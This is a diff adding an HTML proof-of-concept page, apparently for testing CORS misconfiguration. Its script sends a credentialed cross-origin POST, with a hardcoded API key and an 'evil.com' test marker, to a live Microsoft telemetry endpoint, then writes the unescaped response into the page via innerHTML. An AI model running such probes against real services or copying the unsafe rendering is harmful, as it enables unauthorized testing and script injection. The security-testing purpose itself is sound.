@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head><title>CORS Test</title></head>
+  <body>
+    <h2>Testing CORS Misconfiguration</h2>
+    <script>
+      fetch("https://browser.events.data.microsoft.com/OneCollector/1.0/?cors=true&content-type=application/x-json-stream", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-json-stream",
+          "Client-Id": "NO_AUTH",
+          "Client-Version": "1DS-Web-JS-3.2.6",
+          "Apikey": "69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293"
+        },
+        body: JSON.stringify({
+          name: "PoCTest",
+          time: new Date().toISOString(),
+          iKey: "test",
+          data: { test: "evil.com CORS check" }
+        })
+      })
+      .then(response => {
+        console.log("Status:", response.status);
+        console.log("Headers:", [...response.headers.entries()]);
+        return response.text();
+      })
+      .then(data => {
+        console.log("Response Body:", data);
+        document.body.innerHTML += `<pre>${data}</pre>`;
+      })
+      .catch(err => {
+        console.error("Fetch failed:", err);
+        document.body.innerHTML += `<pre>Fetch failed: ${err}</pre>`;
+      });
+    </script>
+  </body>
+</html>
